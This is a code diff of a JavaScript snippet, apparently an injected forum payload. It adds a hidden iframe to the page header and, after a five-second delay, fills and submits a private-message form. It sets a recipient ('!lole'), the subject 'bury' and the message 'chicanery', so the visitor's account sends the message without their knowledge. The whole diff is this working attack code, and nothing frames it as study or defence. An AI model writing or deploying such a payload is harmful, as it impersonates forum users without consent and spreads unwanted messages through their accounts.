@@ -13,16 +13,17 @@ if (!document.getElementById("del1me")) {
         iframe.style.zIndex = -1;
         iframe.style.top = "-30px";
         header.append(iframe);
-        const wait = stealThisMoment(stealThisMoment, secondsToMS(3));
+        const wait = stealThisMoment(() => {
+            console.log("5secs!");
+            document.getElementById("del1me").contentWindow.document.getElementById("username_list").value = "!lole";
+            document.getElementById("del1me").contentWindow.document.getElementsByName("add_to")[0].click();
+            document.getElementById("del1me").contentWindow.document.getElementById("subject").value = "bury";
+            document.getElementById("del1me").contentWindow.document.getElementById("message").value = "chicanery";
+            document.getElementById("del1me").contentWindow.document.getElementsByClassName("button1 default-submit-action")[0].click();
+        }, secondsToMS(5));
     };
 }
-function stealThisMoment() {
-    document.getElementById("del1me").contentWindow.document.getElementById("username_list").value = "!lole";
-    document.getElementById("del1me").contentWindow.document.getElementsByName("add_to")[0].click();
-    document.getElementById("del1me").contentWindow.document.getElementById("subject").value = "bury";
-    document.getElementById("del1me").contentWindow.document.getElementById("message").value = "chicanery";
-    document.getElementById("del1me").contentWindow.document.getElementsByClassName("button1 default-submit-action")[0].click();
-}
+
 
 function secondsToMS(seconds) {
     return seconds * 1000;
